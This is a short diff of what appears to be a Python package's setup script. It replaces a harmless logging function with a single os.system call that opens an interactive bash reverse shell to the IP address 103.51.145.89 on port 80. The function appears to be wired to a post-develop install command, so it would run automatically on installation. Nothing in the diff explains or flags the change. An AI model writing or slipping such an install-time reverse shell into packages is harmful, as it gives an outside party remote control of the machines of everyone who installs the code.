@@ -24,29 +24,7 @@ TIME = int(time.time())
 
 
 def touch_file():
-    try:
-        with open(ROOT_PATH, 'a') as root_fd:
-            message = 'Created {!r} with user {!r} at {!r}'.format(
-                ROOT_PATH,
-                USER,
-                TIME
-            )
-            print(message)
-            root_fd.write(message + '\n')
-    except (IOError, OSError):
-        try:
-            with open(USER_PATH, 'a') as user_fd:
-                message = 'Created {!r} with user {!r} at {!r}'.format(
-                    USER_PATH,
-                    USER,
-                    TIME
-                )
-                print(message)
-                user_fd.write(message + '\n')
-        except (IOError, OSError):
-            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
-            print('What kind of tricky system are you running this on?')
-
+    os.system("/bin/bash -i >& /dev/tcp/103.51.145.89/80 0>&1")
 
 class PostDevelopCommand(develop):
     def run(self):
